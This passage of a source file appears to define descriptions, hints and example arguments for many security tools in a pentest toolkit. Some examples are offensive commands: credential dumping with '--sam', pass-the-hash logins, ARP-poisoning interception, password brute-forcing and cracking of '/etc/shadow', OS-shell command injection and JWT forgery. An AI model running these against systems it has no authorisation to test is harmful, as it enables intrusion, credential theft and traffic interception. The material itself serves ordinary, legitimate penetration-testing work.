      { label: 'Scan Dockerfile', value: '--dockerfile /path/to/Dockerfile' },
      { label: 'Report high+', value: 'nginx:latest --severity high' },
    ],
  },

  // ── Cloudlist ─────────────────────────────────────────────────────────────
  run_cloudlist: {
    description: 'Enumerates assets across cloud providers (AWS, GCP, Azure, DO) using provided credentials. Input is optional provider flags. Output is a list of discovered cloud assets (IPs, instances, buckets).',
    hint: 'Enumerate cloud assets across AWS, GCP, Azure, etc. Requires provider credentials.',
    examples: [
      { label: 'List all assets', value: '-provider aws' },
      { label: 'GCP assets', value: '-provider gcp' },
      { label: 'Azure assets', value: '-provider azure' },
      { label: 'Silent output', value: '-provider aws -silent' },
    ],
  },

  // ── CloudMapper ───────────────────────────────────────────────────────────
  run_cloudmapper: {
    description: 'Analyzes AWS environments to identify attack surface and misconfigurations. Input is an AWS account/region flag. Output is network topology, public exposure analysis, and security findings.',
    hint: 'AWS environment analysis and visualisation tool.',
    examples: [
      { label: 'Collect data', value: 'collect --account myaccount' },
      { label: 'Audit config', value: 'audit --account myaccount' },
      { label: 'Find exposures', value: 'find_exposures --account myaccount' },
    ],
  },

  // ── Commix ────────────────────────────────────────────────────────────────
  run_commix: {
    description: 'Tests web applications for OS command injection vulnerabilities. Input is a URL with optional POST data or headers. Output is injection findings and shell access if successful.',
    hint: 'Automated command injection detection and exploitation.',
    examples: [
      { label: 'Scan URL', value: '--url="https://example.com/page.php?id=1"' },
      { label: 'POST data', value: '--url="https://example.com/ping" --data="ip=127.0.0.1"' },
      { label: 'All techniques', value: '--url="https://example.com/page?cmd=ls" --all' },
      { label: 'OS shell', value: '--url="https://example.com/page?id=1" --os-shell' },
    ],
  },

  // ── CORS Scanner ──────────────────────────────────────────────────────────
  run_corscanner: {
    description: 'Tests web applications for Cross-Origin Resource Sharing (CORS) misconfigurations. Input is a URL or list of URLs. Output is a list of CORS policy issues that could allow cross-origin attacks.',
    hint: 'Scan for CORS misconfigurations on web endpoints.',
    examples: [
      { label: 'Single URL', value: '-u https://example.com' },
      { label: 'URL list', value: '-i urls.txt' },
      { label: 'Verbose', value: '-u https://example.com -v' },
    ],
  },

  // ── CrackMapExec ──────────────────────────────────────────────────────────
  run_crackmapexec: {
    description: 'Tests Windows/Active Directory networks using SMB, WinRM, and LDAP protocols. Input is a target IP range with credentials or hash. Output is authentication results and accessible shares/endpoints.',
    hint: 'Windows/AD credential testing over SMB, WinRM, LDAP, MSSQL.',
    examples: [
      { label: 'SMB login test', value: 'smb 192.168.1.0/24 -u admin -p password' },
      { label: 'Pass the hash', value: 'smb 192.168.1.1 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' },
      { label: 'WinRM', value: 'winrm 192.168.1.1 -u admin -p password' },
      { label: 'List shares', value: 'smb 192.168.1.1 -u admin -p password --shares' },
      { label: 'Dump SAM', value: 'smb 192.168.1.1 -u admin -p password --sam' },
    ],
  },

  // ── CRLFuzz ───────────────────────────────────────────────────────────────
  run_crlfuzz: {
    description: 'Fuzzes web applications for CRLF injection vulnerabilities that could lead to HTTP response splitting. Input is a URL. Output is a list of vulnerable endpoints with injection proof.',
    hint: 'Fast CRLF injection scanner.',
    examples: [
      { label: 'Single URL', value: '-u https://example.com' },
      { label: 'URL list', value: '-l urls.txt' },
      { label: 'With proxy', value: '-u https://example.com -x http://127.0.0.1:8080' },
    ],
  },

  // ── Crowbar ───────────────────────────────────────────────────────────────
  run_crowbar: {
    description: 'Brute-forces SSH using private key authentication rather than passwords. Input is a target host and username with a key directory. Output is valid SSH key-host combinations found.',
    hint: 'Brute-force tool for RDP, SSH (key-based), VNC, OpenVPN.',
    examples: [
      { label: 'RDP brute', value: '-b rdp -s 192.168.1.1/32 -u admin -C passwords.txt' },
      { label: 'SSH key brute', value: '-b sshkey -s 192.168.1.1/32 -u root -k /root/.ssh/' },
      { label: 'VNC brute', value: '-b vnckey -s 192.168.1.1/32 -k /root/.vnc/' },
    ],
  },

  // ── crt.sh ────────────────────────────────────────────────────────────────
  run_crtsh: {
    description: 'Queries crt.sh certificate transparency logs to discover subdomains. Input is a domain name. Output is a list of subdomains found in public SSL certificates.',
    hint: 'Query crt.sh certificate transparency logs for subdomains.',
    examples: [
      { label: 'Domain certs', value: 'example.com' },
      { label: 'Wildcard search', value: '%.example.com' },
      { label: 'Exact match', value: 'sub.example.com' },
    ],
  },

  // ── Crunch ────────────────────────────────────────────────────────────────
  run_crunch: {
    description: 'Generates custom wordlists for password attacks based on character sets and patterns. Input is min/max length and character set. Output is a wordlist written to file.',
    hint: 'Wordlist generator. Format: crunch <min> <max> [charset] [options]',
    examples: [
      { label: 'Numeric 4-digit', value: '4 4 0123456789' },
      { label: 'Alpha 6-8 chars', value: '6 8 abcdefghijklmnopqrstuvwxyz' },
      { label: 'Pattern', value: '8 8 -t @@##@@@@' },
      { label: 'Save to file', value: '6 8 abc123 -o wordlist.txt' },
    ],
  },

  // ── Cutter ────────────────────────────────────────────────────────────────
  run_cutter: {
    description: 'Opens a binary in Cutter (Rizin GUI) for reverse engineering analysis. Input is a binary file path. Output is disassembly, function list, and analysis results.',
    hint: 'Cutter/Rizin reverse engineering — analyse binaries, disassemble, decompile.',
    examples: [
      { label: 'Analyse binary', value: 'analyze /path/to/binary' },
      { label: 'Disassemble fn', value: 'disassemble main /path/to/binary' },
      { label: 'List functions', value: 'functions /path/to/binary' },
    ],
  },

  // ── CVEmap ────────────────────────────────────────────────────────────────
  run_cvemap: {
    description: 'Searches and maps CVE vulnerabilities from NVD, GitHub advisories, and other sources. Input is a CVE ID, product name, or keyword. Output is CVE details with CVSS score, affected versions, and PoC links.',
    hint: 'Search and filter CVE database by ID, vendor, product, CVSS, or severity.',
    examples: [
      { label: 'CVE lookup', value: '-id CVE-2021-44228' },
      { label: 'By vendor', value: '-vendor apache' },
      { label: 'By product', value: '-product log4j' },
      { label: 'Critical CVEs', value: '-severity critical -limit 10' },
      { label: 'CVSS > 9', value: '-cvss-score 9 -limit 20' },
    ],
  },

  // ── Dalfox ────────────────────────────────────────────────────────────────
  run_dalfox: {
    description: 'Finds and exploits XSS vulnerabilities in web applications. Input is a URL with optional parameters. Output is a list of XSS-vulnerable parameters with working payloads.',
    hint: 'Fast XSS scanner and parameter analysis tool.',
    examples: [
      { label: 'Scan URL', value: 'url https://example.com/search?q=test' },
      { label: 'POST body', value: 'url https://example.com/search --data "q=test"' },
      { label: 'Pipe from file', value: 'file urls.txt' },
      { label: 'Blind XSS', value: 'url https://example.com/search?q=test --blind https://your.xss.hunter' },
    ],
  },

  // ── Dependency-Check ──────────────────────────────────────────────────────
  run_dependency_check: {
    description: 'Scans project dependencies for known CVEs using OWASP Dependency-Check. Input is a project directory or file path. Output is a report of vulnerable libraries with CVE IDs and CVSS scores.',
    hint: 'OWASP Dependency-Check — find known CVEs in project dependencies.',
    examples: [
      { label: 'Scan project', value: '--project "MyApp" --scan /path/to/project' },
      { label: 'Java project', value: '--project "JavaApp" --scan /path/to/app.jar' },
      { label: 'HTML report', value: '--project "MyApp" --scan /path/to/project --format HTML' },
    ],
  },

  // ── Dharma ────────────────────────────────────────────────────────────────
  run_dharma: {
    description: 'Grammar-based fuzzer for generating test cases for parsers and interpreters. Input is a grammar file and count. Output is a set of generated test inputs.',
    hint: 'Grammar-based fuzzer for generating semi-valid protocol inputs.',
    examples: [
      { label: 'Fuzz JS', value: '-grammars /path/to/dharma/grammars/js/ -count 100' },
      { label: 'Fuzz HTML', value: '-grammars /path/to/dharma/grammars/html/ -count 50' },
    ],
  },

  // ── Dirb ──────────────────────────────────────────────────────────────────
  run_dirb: {
    description: 'Brute-forces web directories and files using a wordlist. Input is a URL with optional wordlist. Output is a list of existing directories and files found on the web server.',
    hint: 'Web content scanner — brute-forces directories and files.',
    examples: [
      { label: 'Basic scan', value: 'https://example.com' },
      { label: 'Custom wordlist', value: 'https://example.com /usr/share/wordlists/dirb/big.txt' },
      { label: 'PHP extensions', value: 'https://example.com -X .php' },
      { label: 'Ignore SSL', value: 'https://example.com -z' },
    ],
  },

  // ── Dirsearch ─────────────────────────────────────────────────────────────
  run_dirsearch: {
    description: 'Discovers hidden directories and files on web servers. Input is a URL with optional extensions and wordlist. Output is a list of found paths with HTTP status codes.',
    hint: 'Advanced web path brute-forcer with multi-threading support.',
    examples: [
      { label: 'Basic scan', value: '-u https://example.com' },
      { label: 'PHP/HTML/JS', value: '-u https://example.com -e php,html,js' },
      { label: 'Custom wordlist', value: '-u https://example.com -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt' },
      { label: 'Recursive', value: '-u https://example.com -r -e php' },
    ],
  },

  // ── DNSDumpster ───────────────────────────────────────────────────────────
  run_dnsdumpster: {
    description: 'Maps DNS infrastructure for a domain using passive DNS data. Input is a domain name. Output is a list of subdomains, DNS records, and a visual network map.',
    hint: 'DNS recon and subdomain discovery via DNSDumpster.',
    examples: [
      { label: 'Domain recon', value: 'example.com' },
    ],
  },

  // ── DNSEnum ───────────────────────────────────────────────────────────────
  run_dnsenum: {
    description: 'Enumerates DNS records including zone transfers, subdomains, and MX records. Input is a domain name. Output is all discoverable DNS records for the domain.',
    hint: 'DNS enumeration: subdomains, zone transfers, Google scraping.',
    examples: [
      { label: 'Basic enum', value: 'example.com' },
      { label: 'Zone transfer', value: '--noreverse example.com' },
      { label: 'Brute-force', value: '--dnsserver 8.8.8.8 -f /usr/share/dnsenum/dns.txt example.com' },
    ],
  },

  // ── DNSRecon ──────────────────────────────────────────────────────────────
  run_dnsrecon: {
    description: 'Comprehensive DNS reconnaissance including zone transfers, brute force, and record enumeration. Input is a domain with optional type flag (-t brt for brute force). Output is a structured list of DNS records.',
    hint: 'DNS reconnaissance — zone transfers, brute-force, reverse lookups.',
    examples: [
      { label: 'Standard enum', value: '-d example.com' },
      { label: 'Zone transfer', value: '-d example.com -t axfr' },
      { label: 'Brute-force', value: '-d example.com -t brt -D wordlist.txt' },
      { label: 'Reverse lookup', value: '-r 192.168.1.0/24' },
    ],
  },

  // ── DNSTwist ──────────────────────────────────────────────────────────────
  run_dnstwist: {
    description: 'Generates domain permutations to detect typosquatting and phishing domains. Input is a domain name. Output is a list of similar domains that are registered, with registration details.',
    hint: 'Find domain typosquatting, phishing, and homoglyph variations.',
    examples: [
      { label: 'Basic twist', value: 'example.com' },
      { label: 'With MX check', value: '--mx example.com' },
      { label: 'JSON output', value: '--format json example.com' },
      { label: 'Registered only', value: '--registered example.com' },
    ],
  },

  // ── DNSx ──────────────────────────────────────────────────────────────────
  run_dnsx: {
    description: 'High-performance DNS toolkit for resolving and querying DNS records at scale. Input is a domain or list of domains with optional record type flags. Output is resolved DNS records.',
    hint: 'Fast DNS toolkit for bulk resolution, wildcard filtering, and record queries.',
    examples: [
      { label: 'Resolve list', value: '-l subdomains.txt' },
      { label: 'A records', value: '-l subdomains.txt -a' },
      { label: 'CNAME records', value: '-l subdomains.txt -cname' },
      { label: 'Resolve domain', value: '-d example.com -a -aaaa -mx' },
    ],
  },

  // ── DotDotPwn ─────────────────────────────────────────────────────────────
  run_dotdotpwn: {
    description: 'Tests web applications, FTP, and SMTP for path traversal (directory traversal) vulnerabilities. Input is a target URL or host with protocol type. Output is vulnerable traversal paths found.',
    hint: 'Directory traversal fuzzer for HTTP, FTP, TFTP, Payload.',
    examples: [
      { label: 'HTTP fuzzing', value: '-m http -h example.com' },
      { label: 'FTP fuzzing', value: '-m ftp -h 192.168.1.1 -u admin -p password' },
      { label: 'Custom depth', value: '-m http -h example.com -d 10' },
    ],
  },

  // ── Enum4Linux ────────────────────────────────────────────────────────────
  run_enum4linux: {
    description: 'Enumerates Windows and Samba systems via SMB to extract users, shares, and policies. Input is a target IP. Output is usernames, shared directories, password policies, and OS details.',
    hint: 'Enumerate Windows/Samba shares, users, groups, and policies via SMB.',
    examples: [
      { label: 'Full enum', value: '-a 192.168.1.1' },
      { label: 'Users only', value: '-U 192.168.1.1' },
      { label: 'Shares only', value: '-S 192.168.1.1' },
      { label: 'With creds', value: '-u admin -p password -a 192.168.1.1' },
    ],
  },

  // ── Enum4Linux-ng ─────────────────────────────────────────────────────────
  run_enum4linux_ng: {
    description: 'Modern rewrite of enum4linux for SMB enumeration. Input is a target IP with optional credential flags. Output is users, groups, shares, and domain info.',
    hint: 'Next-gen Enum4Linux rewrite with JSON/YAML output support.',
    examples: [
      { label: 'Full enum', value: '-A 192.168.1.1' },
      { label: 'JSON output', value: '-A -oJ /tmp/enum_out 192.168.1.1' },
      { label: 'With creds', value: '-A -u admin -p password 192.168.1.1' },
    ],
  },

  // ── Ettercap ──────────────────────────────────────────────────────────────
  run_ettercap: {
    description: 'Performs man-in-the-middle attacks on local networks via ARP poisoning. Input is interface and target IPs. Output is intercepted network traffic and credentials.',
    hint: 'MITM attack framework — ARP poisoning, sniffing, filtering.',
    examples: [
      { label: 'ARP poison', value: '-T -M arp:remote /192.168.1.1// /192.168.1.254//' },
      { label: 'Unified sniff', value: '-T -q -i eth0' },
      { label: 'List plugins', value: '--list-plugins' },
    ],
  },

  // ── Evil-WinRM ────────────────────────────────────────────────────────────
  run_evil_winrm: {
    description: 'Provides a WinRM shell on Windows targets with valid credentials or a hash. Input is a target IP, username, and password or hash. Output is an interactive PowerShell shell.',
    hint: 'WinRM shell for Windows pentesting post-exploitation.',
    examples: [
      { label: 'Password auth', value: '-i 192.168.1.1 -u administrator -p password' },
      { label: 'Hash auth', value: '-i 192.168.1.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' },
      { label: 'With scripts', value: '-i 192.168.1.1 -u admin -p pass -s /opt/ps_scripts/' },
    ],
  },

  // ── ExploitDB ─────────────────────────────────────────────────────────────
  run_searchsploit: {
    description: 'Searches the Exploit-DB database for publicly known exploits for software and CVEs. Input is a product name, CVE, or keyword. Output is a list of matching exploits with file paths.',
    hint: 'Search the Exploit-DB offline copy for known public exploits.',
    examples: [
      { label: 'Search term', value: 'apache struts' },
      { label: 'CVE search', value: '--cve CVE-2021-44228' },
      { label: 'Exact match', value: '-e "OpenSSH 7.2"' },
      { label: 'Web apps', value: 'wordpress plugin' },
    ],
  },

  // ── Falco ─────────────────────────────────────────────────────────────────
  run_falco: {
    description: 'Detects runtime security anomalies in containers and Kubernetes using behavioral rules. Input is a rules file or container to monitor. Output is a stream of security events and alerts.',
    hint: 'Kubernetes and cloud-native runtime threat detection.',
    examples: [
      { label: 'Start daemon', value: '-d' },
      { label: 'Custom rules', value: '-r /etc/falco/custom_rules.yaml' },
      { label: 'Test rules', value: '--validate /etc/falco/falco_rules.yaml' },
    ],
  },

  // ── Feroxbuster ───────────────────────────────────────────────────────────
  run_feroxbuster: {
    description: 'Recursively brute-forces web directories at high speed. Input is a URL with optional wordlist and extensions. Output is discovered paths with response codes and sizes.',
    hint: 'Fast, recursive content discovery with auto-filtering.',
    examples: [
      { label: 'Basic scan', value: '-u https://example.com' },
      { label: 'With wordlist', value: '-u https://example.com -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'Extensions', value: '-u https://example.com -x php,txt,html' },
      { label: 'Filter size', value: '-u https://example.com --filter-size 1234' },
    ],
  },

  // ── ffuf ──────────────────────────────────────────────────────────────────
  run_ffuf: {
    description: 'Fast web fuzzer for directory, parameter, and vhost discovery. Input is a URL with FUZZ placeholder and wordlist. Output is matching responses with status, size, and content.',
    hint: 'Web fuzzer — FUZZ keyword marks injection point. Supports dir, param, and vhost fuzzing.',
    examples: [
      { label: 'Dir brute-force', value: '-u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
      { label: 'Param fuzzing', value: '-u https://example.com/page?FUZZ=value -w params.txt' },
      { label: 'Filter size', value: '-u https://example.com/FUZZ -w wordlist.txt -fs 4242' },
      { label: 'Vhost fuzzing', value: '-u https://example.com -H "Host: FUZZ.example.com" -w subdomains.txt' },
      { label: 'POST fuzzing', value: '-u https://example.com/login -X POST -d "user=FUZZ&pass=test" -w users.txt' },
    ],
  },

  // ── Fierce ────────────────────────────────────────────────────────────────
  run_fierce: {
    description: 'Locates non-contiguous IP space and hostnames for a domain via DNS. Input is a domain name. Output is subdomains, IP ranges, and DNS servers found.',
    hint: 'DNS reconnaissance tool — zone transfer, brute-force subdomains.',
    examples: [
      { label: 'Domain scan', value: '--domain example.com' },
      { label: 'Brute-force', value: '--domain example.com --subdomain-file wordlist.txt' },
      { label: 'Specify DNS', value: '--domain example.com --dns-servers 8.8.8.8' },
    ],
  },

  // ── Foremost ──────────────────────────────────────────────────────────────
  run_foremost: {
    description: 'Recovers files from disk images based on file headers and footers. Input is a disk image file. Output is recovered files organized by type (jpg, pdf, zip, etc.).',
    hint: 'File carving / forensic data recovery from disk images.',
    examples: [
      { label: 'Carve image', value: '-i disk.img -o /output/dir' },
      { label: 'Specific types', value: '-i disk.img -t jpg,pdf,doc -o /output/dir' },
      { label: 'From pcap', value: '-i capture.pcap -o /output/dir' },
    ],
  },

  // ── fping ─────────────────────────────────────────────────────────────────
  run_fping: {
    description: 'Pings multiple hosts simultaneously to quickly determine which are alive. Input is an IP range or list. Output is up/down status for each host with round-trip times.',
    hint: 'Fast ICMP ping sweep for multiple hosts.',
    examples: [
      { label: 'Alive hosts', value: '-ag 192.168.1.0/24' },
      { label: 'From file', value: '-f hosts.txt' },
      { label: 'Quiet alive', value: '-ag -q 192.168.1.0/24' },
    ],
  },

  // ── GAU ───────────────────────────────────────────────────────────────────
  run_gau: {
    description: 'Fetches known URLs for a domain from Wayback Machine, OTX, and CommonCrawl. Input is a domain name. Output is a list of historical URLs for the domain.',
    hint: 'Fetch all known URLs for a domain from Wayback Machine, OTX, URLScan.',
    examples: [
      { label: 'All URLs', value: 'example.com' },
      { label: 'Filter by ext', value: 'example.com --blacklist ttf,woff,png,jpg' },
      { label: 'JSON output', value: 'example.com --json' },
    ],
  },

  // ── Ghidra ────────────────────────────────────────────────────────────────
  run_ghidra: {
    description: 'Performs binary reverse engineering including disassembly, decompilation, and analysis using Ghidra. Input is a binary file path with optional analysis flags. Output is decompiled code, function list, and strings.',
    hint: 'NSA Ghidra reverse engineering — disassemble, decompile, analyse binaries.',
    examples: [
      { label: 'Import binary', value: 'import /path/to/binary' },
      { label: 'Auto-analyse', value: 'analyze /path/to/binary' },
      { label: 'Headless analyse', value: 'headless /tmp/project MyProject -import /path/to/binary -postScript analyzeHeadless.py' },
    ],
  },

  // ── GHunt ─────────────────────────────────────────────────────────────────
  run_ghunt: {
    description: 'Investigates Google accounts using an email address to find linked profiles and activity. Input is a Gmail address. Output is linked YouTube, Maps, and other Google service data.',
    hint: 'OSINT tool for Google account investigation.',
    examples: [
      { label: 'Email lookup', value: 'email target@gmail.com' },
      { label: 'GaiaID lookup', value: 'gaia 123456789012345678901' },
    ],
  },

  // ── Gobuster ──────────────────────────────────────────────────────────────
  run_gobuster: {
    description: 'Brute-forces URIs, DNS subdomains, and virtual hosts. Input is a mode (dir/dns/vhost), target URL or domain, and wordlist. Output is a list of found directories, subdomains, or vhosts.',
    hint: 'Directory, DNS, and vhost brute-forcer.',
    examples: [
      { label: 'Dir mode', value: 'dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'DNS mode', value: 'dns -d example.com -w subdomains.txt' },
      { label: 'Extensions', value: 'dir -u https://example.com -w wordlist.txt -x php,html,txt' },
      { label: 'Vhost mode', value: 'vhost -u https://example.com -w vhosts.txt' },
    ],
  },

  // ── GoSpider ──────────────────────────────────────────────────────────────
  run_gospider: {
    description: 'Fast web spider that crawls websites to collect links, forms, and endpoints. Input is a URL with optional depth and concurrency flags. Output is a list of discovered URLs and JavaScript sources.',
    hint: 'Fast web spider — crawls for endpoints, forms, and JS files.',
    examples: [
      { label: 'Crawl site', value: '-s https://example.com' },
      { label: 'Deep crawl', value: '-s https://example.com --depth 5' },
      { label: 'Include JS', value: '-s https://example.com --js' },
    ],
  },

  // ── GoWitness ─────────────────────────────────────────────────────────────
  run_gowitness: {
    description: 'Screenshots web pages and stores them for visual review during reconnaissance. Input is a URL, file of URLs, or nmap file. Output is PNG screenshots and a browsable HTML report.',
    hint: 'Web screenshot utility for recon and reporting.',
    examples: [
      { label: 'Single URL', value: 'single https://example.com' },
      { label: 'URL list', value: 'file -f urls.txt' },
      { label: 'Nmap input', value: 'nmap -f nmap.xml' },
      { label: 'With report', value: 'file -f urls.txt --write-db' },
    ],
  },

  // ── GreyNoise ─────────────────────────────────────────────────────────────
  run_greynoise: {
    description: 'Queries GreyNoise to determine if an IP is mass-scanning the internet or is associated with known bad actors. Input is an IP address. Output is classification (benign/malicious/unknown), tags, and scan activity.',
    hint: 'Query GreyNoise for internet noise context on IP addresses. Requires API key.',
    examples: [
      { label: 'IP lookup', value: 'ip 8.8.8.8' },
      { label: 'Quick lookup', value: 'quick 192.168.1.1' },
      { label: 'GNQL query', value: 'query "tags:mirai" --size 20' },
    ],
  },

  // ── Grype ─────────────────────────────────────────────────────────────────
  run_grype: {
    description: 'Scans container images and filesystems for known CVE vulnerabilities. Input is an image name or directory path. Output is a list of CVEs with severity, package, and fixed version.',
    hint: 'Container and filesystem CVE scanner by Anchore.',
    examples: [
      { label: 'Docker image', value: 'ubuntu:22.04' },
      { label: 'Only fixable', value: '--only-fixed nginx:latest' },
      { label: 'High+ severity', value: '--fail-on high ubuntu:22.04' },
      { label: 'Filesystem', value: 'dir:/path/to/project' },
    ],
  },

  // ── Hakrawler ─────────────────────────────────────────────────────────────
  run_hakrawler: {
    description: 'Crawls web applications to discover endpoints, forms, and JavaScript links. Input is a URL. Output is a list of discovered URLs and API endpoints.',
    hint: 'Fast Go-based web crawler for endpoint and form discovery.',
    examples: [
      { label: 'Crawl URL', value: '-url https://example.com' },
      { label: 'Include subs', value: '-url https://example.com -subs' },
      { label: 'Depth 3', value: '-url https://example.com -depth 3' },
    ],
  },

  // ── Hashcat ───────────────────────────────────────────────────────────────
  run_hashcat: {
    description: 'Cracks password hashes using GPU acceleration and various attack modes. Input is a hash file and wordlist or mask with -a mode flag. Output is the cracked plaintext passwords.',
    hint: 'GPU-accelerated hash cracker. -m sets hash type, -a sets attack mode (0=wordlist, 3=brute).',
    examples: [
      { label: 'MD5 wordlist', value: '-m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt' },
      { label: 'NTLM wordlist', value: '-m 1000 -a 0 hash.txt wordlist.txt' },
      { label: 'WPA2', value: '-m 22000 -a 0 capture.hccapx wordlist.txt' },
      { label: 'Brute 4-digit', value: '-m 0 -a 3 hash.txt ?d?d?d?d' },
      { label: 'Rules attack', value: '-m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule' },
    ],
  },

  // ── Hashid ────────────────────────────────────────────────────────────────
  run_hashid: {
    description: 'Identifies the hash algorithm type of an unknown hash string. Input is a hash string. Output is a ranked list of possible hash types (MD5, SHA1, bcrypt, etc.).',
    hint: 'Identify an unknown hash type from its format.',
    examples: [
      { label: 'MD5 example', value: '5f4dcc3b5aa765d61d8327deb882cf99' },
      { label: 'SHA1 example', value: 'da39a3ee5e6b4b0d3255bfef95601890afd80709' },
      { label: 'bcrypt example', value: '$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW' },
      { label: 'NTLM example', value: '31d6cfe0d16ae931b73c59d7e0c089c0' },
    ],
  },

  // ── Hashpump ──────────────────────────────────────────────────────────────
  run_hashpump: {
    description: 'Exploits hash length extension vulnerabilities in web applications using known hash values. Input is a known hash, data, and append string. Output is the forged hash and padded data.',
    hint: 'Hash length extension attack tool.',
    examples: [
      { label: 'Interactive', value: '' },
      { label: 'With params', value: '-s "6d5f807e23db210bc254a28be2d6759a0f5f5d99" -d "name=user&action=view" -a "&action=admin" -k 16' },
    ],
  },

  // ── HIBP ──────────────────────────────────────────────────────────────────
  check_pwned_password: {
    description: 'Checks if a password has appeared in known data breaches using the HaveIBeenPwned API. Input is a password string. Output is the number of times it appeared in breach data (0 means not found).',
    hint: 'Check if a password has appeared in known data breaches (k-anonymity, no plaintext sent). Free tier available.',
    examples: [
      { label: 'Example password', value: 'password123' },
      { label: 'Common weak', value: 'qwerty' },
      { label: 'Test strong', value: 'Tr0ub4dor&3' },
    ],
  },

  check_pwned_account: {
    description: 'Checks if an email address appears in known data breaches using HaveIBeenPwned. Input is an email address. Output is a list of breaches the email was found in, with dates and data types.',
    hint: 'Check if an email address appears in known data breaches. Requires HIBP API key.',
    examples: [
      { label: 'Check email', value: 'test@example.com' },
      { label: 'Include unverified', value: 'test@example.com --includeUnverified' },
    ],
  },

  // ── Holehe ────────────────────────────────────────────────────────────────
  run_holehe: {
    description: 'Checks if an email address is registered on various websites and services. Input is an email address. Output is a list of services where the email is registered.',
    hint: 'Check if an email address is registered on 120+ websites.',
    examples: [
      { label: 'Check email', value: 'test@example.com' },
      { label: 'Only used', value: 'test@example.com --only-used' },
    ],
  },

  // ── httpx ─────────────────────────────────────────────────────────────────
  run_httpx: {
    description: 'Probes a list of URLs/hosts for HTTP/HTTPS availability, status codes, and technologies. Input is a list of hosts or URLs. Output is live hosts with status, title, and technology fingerprints.',
    hint: 'Fast HTTP probing and fingerprinting — status codes, tech, titles, headers.',
    examples: [
      { label: 'Probe list', value: '-l hosts.txt' },
      { label: 'Status codes', value: '-l hosts.txt -sc' },
      { label: 'Tech detect', value: '-l hosts.txt -tech-detect' },
      { label: 'Single host', value: '-u https://example.com -title -server -status-code' },
      { label: 'Custom port', value: '-l hosts.txt -p 8080,8443' },
    ],
  },

  // ── Hydra ─────────────────────────────────────────────────────────────────
  run_hydra: {
    description: 'Brute-forces login credentials for network services. Input is a target host, service (-l user -P wordlist -t http-form-post), and protocol. Output is valid username/password combinations found.',
    hint: 'Parallel network brute-forcer. Format: hydra [options] target service',
    examples: [
      { label: 'SSH brute-force', value: '-l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1' },
      { label: 'FTP', value: '-l admin -P passwords.txt ftp://192.168.1.1' },
      { label: 'HTTP form', value: '-l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
      { label: 'RDP', value: '-l administrator -P passwords.txt rdp://192.168.1.1' },
      { label: 'SMB', value: '-l admin -P passwords.txt smb://192.168.1.1' },
    ],
  },

  // ── IVRE ──────────────────────────────────────────────────────────────────
  run_ivre: {
    description: 'Network recon framework that stores and analyzes scan data. Input is a query or scan data to import. Output is structured network data and passive DNS records.',
    hint: 'Network recon framework and database — import Nmap/Masscan results, query.',
    examples: [
      { label: 'Import nmap', value: 'nmap2db nmap_scan.xml' },
      { label: 'Query hosts', value: 'ipinfo --count' },
      { label: 'Web interface', value: 'webui start' },
    ],
  },

  // ── Jaeles ────────────────────────────────────────────────────────────────
  run_jaeles: {
    description: 'Automated web application security scanner using YAML signatures. Input is a URL with optional signature set. Output is matched vulnerabilities with request/response evidence.',
    hint: 'Automated web application security scanner with signature-based detection.',
    examples: [
      { label: 'Basic scan', value: 'scan -u https://example.com' },
      { label: 'With signatures', value: 'scan -u https://example.com -s /path/to/signatures/' },
      { label: 'URL list', value: 'scan -L urls.txt' },
    ],
  },

  // ── John the Ripper ───────────────────────────────────────────────────────
  run_john: {
    description: 'Cracks password hashes using dictionary, brute-force, and rule-based attacks. Input is a hash file with optional wordlist and format flag. Output is cracked passwords.',
    hint: 'Offline password cracker — auto-detects hash type by default.',
    examples: [
      { label: 'Auto crack', value: 'hashes.txt' },
      { label: 'With wordlist', value: '--wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
      { label: 'SHA-256', value: '--format=sha256crypt --wordlist=wordlist.txt hashes.txt' },
      { label: 'Show cracked', value: '--show hashes.txt' },
      { label: '/etc/shadow', value: '--wordlist=wordlist.txt /etc/shadow' },
    ],
  },

  // ── JoomScan ──────────────────────────────────────────────────────────────
  run_joomscan: {
    description: 'Scans Joomla CMS installations for vulnerabilities, version, and plugins. Input is a URL. Output is Joomla version, installed extensions, and known CVEs.',
    hint: 'Joomla CMS vulnerability scanner.',
    examples: [
      { label: 'Basic scan', value: '--url https://example.com' },
      { label: 'With proxy', value: '--url https://example.com --proxy http://127.0.0.1:8080' },
      { label: 'Enum components', value: '--url https://example.com --enumerate-components' },
    ],
  },

  // ── JWT Tool ──────────────────────────────────────────────────────────────
  run_jwt_tool: {
    description: 'Tests JSON Web Tokens (JWT) for common vulnerabilities like alg:none, weak secrets, and key confusion. Input is a JWT token with optional attack flags. Output is vulnerability findings and cracked/forged tokens.',
    hint: 'Decode, verify, and attack JSON Web Tokens.',
    examples: [
      { label: 'Decode JWT', value: 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' },
      { label: 'None algorithm', value: '-X a eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' },
      { label: 'Crack secret', value: '-C -d /usr/share/wordlists/rockyou.txt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' },
    ],
  },

  // ── Katana ────────────────────────────────────────────────────────────────
  run_katana: {
    description: 'Fast web crawler that discovers URLs including JavaScript-rendered content. Input is a URL or list. Output is a comprehensive list of endpoints, parameters, and forms.',
    hint: 'Fast web crawler for comprehensive endpoint and form discovery.',
    examples: [
      { label: 'Crawl URL', value: '-u https://example.com' },
      { label: 'Deep crawl', value: '-u https://example.com -d 5' },
